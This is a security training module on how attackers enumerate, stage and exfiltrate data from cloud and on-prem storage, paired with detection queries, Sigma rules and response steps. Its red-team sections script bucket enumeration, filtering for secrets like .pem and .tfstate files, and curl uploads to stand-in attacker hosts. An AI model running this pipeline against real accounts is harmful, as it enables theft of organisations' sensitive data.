# 08 — Content Discovery & Data Staging

> **Level:** Advanced
> **Prereqs:** [04-01](./object-storage-primitives.md) through [04-07](./pre-signed-urls-and-tokenized-access.md); cross-link to [09-Red-Team-Offense](../Red-Team-Offense/)
> **Clouds:** AWS · Azure · GCP · OnPrem
> **MITRE ATT&CK (tactics):** Discovery, Collection, Exfiltration
> **Authorization scope:** Run only against your own storage accounts / a dedicated sandbox bucket.

## What & why

Before exfiltrating data, attackers enumerate what exists, identify high-value targets by metadata (size, extension, key pattern), and stage the most valuable files for transfer. Defenders see abnormal `ListObjects` patterns, `HeadObject` bursts, and CPU spikes from compression/packaging. Understanding the enumeration-to-exfil pipeline reveals detection opportunities.

## The OnPrem reality

An attacker on a compromised host inside the network runs `find` to locate high-value files before packaging and exfiltrating:

```bash
# OnPrem: enumeration and staging
find /mnt/smb -type f -size +50M -exec ls -lah {} \; | sort -k5 -rh | head -20
tar czf /tmp/exfil.tar.gz /mnt/smb/finance/*.xlsx
curl -X POST --data-binary @/tmp/exfil.tar.gz https://attacker-controlled.example.com/upload
```

The entire workflow — find, sort, compress, upload — produced detectable signals: NFS read storms, CPU spikes on the file server, outbound connections to unknown IPs on port 443.

## Core concepts

**Attacker staging pipeline (cloud equivalent):**

```
Enumeration → Selection → Compression → Packaging → Exfiltration
ListObjects  HeadObject   CPU-bound     tar/zip     HTTP POST to external
(paged)      (size,type)  (memory)      (staging)   (allowed-egress path)
```

**Enumeration patterns per cloud:**

| Cloud | Enumeration API | Paged? | Max results/page | Metadata in list | Cost signal |
|---|---|---|---|---|---|
| AWS | `ListObjectsV2` | Yes (continuation token) | 1000 | Key, size, last modified, ETag | $0.005/1000 requests |
| Azure | `List Blobs` | Yes (marker token) | 5000 | Name, size, last modified, ETag | $0.005/10,000 operations |
| GCP | `storage.objects.list` | Yes (page token) | 1000 | Name, size, updated, generation | Free (class A op) |
| OnPrem | `find` + `ls` | N/A | N/A | stat() calls | Disk I/O + inode cache |

**Compression vs encryption:**
- Attackers compress before encrypting (CTR mode or no encryption for speed).
- High CPU during compression is a host-level signal separate from the cloud API signal.
- Checksum comparison (pre/post compression) validates data integrity without re-downloading.

## AWS

```bash
# Attacker enumeration flow (contained — all against own bucket)
# Step 1 — Paginated listing of all objects
BUCKET="example-security-lab-111111111111"
TOKEN=""
while true; do
  PAGE=$(aws s3api list-objects-v2 \
    --bucket $BUCKET \
    --max-items 1000 \
    ${TOKEN:+--starting-token $TOKEN} \
    --query "{Contents:[Contents[].{Key:Key,Size:Size,LastModified:LastModified}],NextToken:NextToken}")
  echo "$PAGE" | jq '.Contents[]' >> /tmp/enumeration.json
  TOKEN=$(echo "$PAGE" | jq -r '.NextToken // empty')
  [ -z "$TOKEN" ] && break
done

# Step 2 — Filter high-value targets (>1MB, .sql/.csv/.xlsx/.pem extensions)
cat /tmp/enumeration.json | jq -r 'select(.Size > 1048576) | "\(.Key) \(.Size)"' | \
  grep -E '\.(sql|csv|xlsx|pem|json|tar\.gz|zip)$' > /tmp/high_value_targets.txt

# Step 3 — HeadObject to confirm targets before download
while read -r KEY SIZE; do
  aws s3api head-object --bucket $BUCKET --key "$KEY" \
    --query "{Key:'$KEY',Size:$SIZE,StorageClass:StorageClass,ServerSideEncryption:ServerSideEncryption}" \
    >> /tmp/confirmed_targets.json
done < /tmp/high_value_targets.txt

# Step 4 — Download and compress for staging
mkdir -p /tmp/staging
while read -r KEY SIZE; do
  aws s3 cp "s3://$BUCKET/$KEY" "/tmp/staging/$KEY"
done < /tmp/high_value_targets.txt
tar czf /tmp/exfil_bundle.tar.gz -C /tmp/staging .

# Step 5 — Compute checksum for integrity verification
sha256sum /tmp/exfil_bundle.tar.gz > /tmp/exfil_bundle.sha256
```

**Cost signal:** 100 `ListObjectsV2` calls cost $0.0005 (negligible) but generate 100 CloudTrail events. 10,000 `HeadObject` calls generate 10,000 CloudTrail events — a much stronger signal.

## Azure

```bash
# Step 1 — Enumerate containers
az storage container list \
  --account-name securitylab111111111111 \
  --auth-mode login \
  --query "[].name" -o tsv

# Step 2 — Paged blob listing per container
az storage blob list \
  --container-name test-container \
  --account-name securitylab111111111111 \
  --auth-mode login \
  --query "[].{Name:name,Size:properties.contentLength,Modified:properties.lastModified}" \
  --output table

# Step 3 — Download filtered targets
az storage blob download-batch \
  --destination /tmp/staging \
  --source test-container \
  --pattern "*.sql" \
  --account-name securitylab111111111111 \
  --auth-mode login
```

## GCP

```bash
# Step 1 — List objects with filter for high-value extensions
gcloud storage ls -r --recursive gs://security-lab-111111111111/**/*.sql

# Step 2 — Head each object for metadata
gcloud storage objects describe gs://security-lab-111111111111/customers.sql \
  --format="table(name, size, updated, storageClass, kmsKeyName)"

# Step 3 — Download + compress
mkdir -p /tmp/staging
gcloud storage cp gs://security-lab-111111111111/customers.sql /tmp/staging/
tar czf /tmp/exfil_bundle.tar.gz -C /tmp/staging .
```

## OnPrem mapping

| Concern | OnPrem | AWS | Azure | GCP |
|---|---|---|---|---|
| Enumeration | `find /mnt/smb -size +50M` | `ListObjectsV2` (paged) | `List Blobs` (paged) | `storage.objects.list` (paged) |
| Metadata | `stat` | `HeadObject` | `Get Blob Properties` | `storage.objects.get` (no alt=media) |
| High-value filter | `grep -E '\.(xlsx|sql)$'` | JQ filter on Key extension | `--pattern` filter | `**/*.sql` glob |
| Compression | `tar czf` | Same (local) | Same (local) | Same (local) |
| Exfil path | `curl POST` to attacker server | Same (assuming open egress) | Same | Same |
| Signal | NFS read storm + CPU | 10K+ CloudTrail `ListObjects/HeadObject` | 10K+ Storage Analytics `GetBlobProperties` | 10K+ Audit Logs `storage.objects.get/list` |

## 🔴 Red Team view

A contained walkthrough of how an attacker stages data for exfiltration, demonstrating the observable signals at each step:

```bash
# === PHASE 1: Discovery ===
# Attacker enumerates all buckets in the account
aws s3api list-buckets --query "Buckets[].Name" --output text

# List contents of each bucket (200 buckets × 3 pages average = 600 ListObjectsV2 calls)
for BUCKET in $(aws s3api list-buckets --query "Buckets[].Name" --output text); do
  aws s3api list-objects-v2 --bucket "$BUCKET" --max-items 1000 \
    >> /tmp/discovery_$BUCKET.json 2>/dev/null
done
# CloudTrail signal: 600+ ListObjects events from a single principal in < 5 minutes
# Multiple paginated calls to the same bucket in rapid succession

# === PHASE 2: Targeting ===
# Identify files matching sensitive patterns
find /tmp/discovery_*.json -exec jq -r '.Contents[]? | select(.Key | test("\\.(sql|pem|kube|tfstate|env|yml)$")) | "\(.Key) \(.Size)"' {} \; \
  | sort -t' ' -k2 -rn | head -50 > /tmp/targets.txt
# No API call — local processing. But HeadObject phase follows:

# === PHASE 3: HeadObject burst (metadata verification) ===
while read -r KEY SIZE; do
  aws s3api head-object --bucket "$BUCKET" --key "$KEY"
done < /tmp/targets.txt
# CloudTrail signal: 50 rapid HeadObject events — high ratio of Head to Get

# === PHASE 4: Exfiltration (contained — simulated, not real transfer) ===
# Attacker downloads targeted files to staging directory
mkdir -p /tmp/staging
while read -r KEY SIZE; do
  aws s3 cp "s3://$BUCKET/$KEY" "/tmp/staging/$KEY"
done < /tmp/targets.txt

# Compress bundle
tar czf /tmp/staging/exfil_$(date +%s).tar.gz -C /tmp/staging --exclude='*.tar.gz' .

# Transfer via allowed egress path (simulated — no real exfil)
echo "Simulated exfil: sha256sum /tmp/staging/exfil_*.tar.gz"
sha256sum /tmp/staging/exfil_*.tar.gz
# In a real attack: curl -X POST --data-binary @exfil.tar.gz https://attacker.example.com/ingest
```

**Artifacts left:**
1. **CloudTrail pattern:** High ratio of `ListObjects`/`HeadObject` calls to `GetObject` calls from a single principal in a short window.
2. **CloudWatch Metrics:** Spike in `NumberOfObjects` HEAD requests, elevated `ListRequests` count.
3. **VPC Flow Logs (if egress):** Outbound HTTPS connection with large data transfer to an IP with no prior DNS resolution history.
4. **Host-level:** High CPU (compression), disk I/O spike on the instance making the calls, large `aws s3 cp` process tree.

## 🔵 Blue Team view

**Detection — List-to-Read ratio anomaly:**
```sql
-- AWS CloudTrail: ratio of List/Head to GetObject
WITH counts AS (
  SELECT
    userIdentity.arn,
    SUM(CASE WHEN eventName IN ('ListObjects','ListObjectsV2') THEN 1 ELSE 0 END) AS list_count,
    SUM(CASE WHEN eventName = 'HeadObject' THEN 1 ELSE 0 END) AS head_count,
    SUM(CASE WHEN eventName = 'GetObject' THEN 1 ELSE 0 END) AS get_count
  FROM cloudtrail_logs
  WHERE eventTime > now() - interval '1 hour'
  GROUP BY userIdentity.arn
)
SELECT *, ROUND((list_count + head_count)::numeric / NULLIF(get_count,0), 2) AS scan_ratio
FROM counts
WHERE list_count > 50 AND (list_count + head_count) > (get_count * 5)
ORDER BY scan_ratio DESC
```

```kusto
// Azure: bucket enumeration anomaly (ListBlob <-> GetBlob ratio)
StorageBlobLogs
| where TimeGenerated > ago(1h)
| summarize ListCount=countif(OperationName == "ListBlob"),
            HeadCount=countif(OperationName == "GetBlobProperties"),
            GetCount=countif(OperationName == "GetBlob")
            by AccountName, CallerIpAddress
| extend ScanRatio = (ListCount + HeadCount) * 1.0 / iif(GetCount == 0, 1, GetCount)
| where ListCount > 50 and ScanRatio > 5
| project AccountName, CallerIpAddress, ListCount, GetCount, ScanRatio
```

```sql
-- GCP: anomaly in list vs get operations
SELECT
  protoPayload.authenticationInfo.principalEmail,
  COUNTIF(protoPayload.methodName = "storage.objects.list") AS list_ops,
  COUNTIF(protoPayload.methodName = "storage.objects.get") AS get_ops
FROM `project-id.cloud_audit_logs._AllLogs`
WHERE timestamp > TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 1 HOUR)
  AND resource.type = "gcs_bucket"
GROUP BY principalEmail
HAVING list_ops > 50 AND list_ops > get_ops * 5
```

**Preventive controls — SCP limiting ListObjects rate:**
```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Deny",
    "Action": ["s3:ListBucket"],
    "Resource": ["*"],
    "Condition": {
      "NumericGreaterThan": {
        "s3:ListBucket:max-keys": 100
      }
    }
  }]
}
```

> (as of June 2026, the `s3:ListBucket:max-keys` condition key is not a standard IAM condition key — `s3:max-keys` is a request parameter, not a condition key. Use `s3:prefix` condition to limit scope, or implement throttling via a Lambda authorizer/CloudFront function.)

**GuardDuty / Defender / SCC signals:**
- **AWS GuardDuty:** `Discovery:S3/MaliciousIPCaller.Custom`, `Discovery:S3/TorIPCaller`
- **Azure Defender for Storage:** `Unusual access patterns`, `List anomaly`
- **GCP Security Command Center:** `Exfiltration:Anomalous GCS List Operations`

**Response:**
1. If scan_ratio > 10: immediately revoke the principal's active sessions (`aws iam delete-role-policy` / `az role assignment delete`).
2. Check if any `GetObject` calls targeted high-value keys (`.pem`, `.sql`, `.tfstate`) — if so, those files were likely exfiltrated.
3. Review VPC Flow Logs for outbound transfers from the IP that performed the listing.
4. Rotate any credentials or keys that were stored in the enumerated buckets.
5. If exfiltration is confirmed: initiate incident response, preserve CloudTrail logs for forensics.

## Hands-on lab

1. Create a bucket/container with 500+ objects of varying sizes (script: generate random files).
2. Enable CloudTrail / Storage Analytics / Cloud Audit Logs on the bucket.
3. Run a simulated enumeration: paginated `ListObjects` across all objects, then `HeadObject` on the 10 largest.
4. Wait 15 minutes for logs to propagate.
5. Query the logs to find the ratio of List/Head to Get operations.
6. **Teardown:** Delete the test bucket and generated files.

```bash
# Generate 500 test objects quickly
for i in $(seq 1 500); do
  dd if=/dev/urandom of="/tmp/obj_${i}" bs=1024 count=$((RANDOM % 100 + 1)) 2>/dev/null
  aws s3 cp "/tmp/obj_${i}" "s3://example-security-lab-111111111111/objects/obj_${i}.dat"
done
```

**Expected output:** Log query shows List/Head ratio > 5:1 during the enumeration window, dropping to < 1:1 during normal application access.

## Detection rules & checklists

```yaml
# Sigma rule — Cloud storage enumeration anomaly
title: Cloud Storage Content Discovery Anomaly
status: experimental
description: High ratio of List/Head to Get operations indicates enumeration
logsource:
  product: cloud
  service: object_storage
detection:
  timeframe: 15m
  condition: >
    (list_count + head_count) > 100 and (list_count + head_count) / max(get_count, 1) > 5
level: medium
```

```bash
# AWS: check ListObjects/HeadObject ratio per principal (last hour)
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=ListObjects \
  --start-time "$(date -u -v-1H +%s)" --end-time "$(date -u +%s)" \
  --query "Events[].Username" --output text | sort | uniq -c | sort -rn

# Azure: similar via Log Analytics (requires workspace)
# GCP: similar via gcloud logging read (requires log sink)

# Universal: SCP to restrict ListObjects to known CI/CD / application roles
# Ensure only service roles (not human users) have s3:ListBucket on production data buckets
aws s3api get-bucket-policy --bucket example-prod-data-111111111111 | \
  jq '.Statement[] | select(.Action[] | contains("ListBucket"))'
```

## References

- [AWS GuardDuty S3 protection findings](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_findings-s3.html)
- [Azure Defender for Storage — anomaly detection](https://learn.microsoft.com/en-us/azure/defender-for-cloud/defender-for-storage-introduction)
- [GCP Security Command Center — GCS findings](https://cloud.google.com/security-command-center/docs/how-to-use-event-threat-detection)
- [MITRE ATT&CK T1530 — Data from Cloud Storage](https://attack.mitre.org/techniques/T1530/)
- [MITRE ATT&CK T1048 — Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048/)
- Cross-ref: [../Red-Team-Offense/](../Red-Team-Offense/) for full exfiltration chains
